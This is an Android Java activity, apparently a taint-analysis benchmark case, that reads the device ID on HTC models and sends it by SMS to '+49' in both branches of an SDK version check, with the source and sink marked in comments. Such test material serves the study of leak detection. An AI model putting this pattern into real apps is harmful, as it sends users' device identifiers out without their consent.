package de.upb.swt.singleifbranch1;

import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class MainActivity extends AppCompatActivity {
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        String deviceID="";
        String model=Build.MODEL;
        if(model.equals("HTC"))
        {
            deviceID= telephonyManager.getDeviceId();//source, MODEL
        }
        int sdk = Build.VERSION.SDK_INT;
        if (sdk < 15) {
            SmsManager sms = SmsManager.getDefault();//sdk>15
            sms.sendTextMessage("+49", null,deviceID, null, null); // sink,  sdk>15
        }
        else
        {
            SmsManager sms = SmsManager.getDefault();//sdk>15
            sms.sendTextMessage("+49", null,deviceID, null, null); // sink,  sdk<=15
        }
    }
}
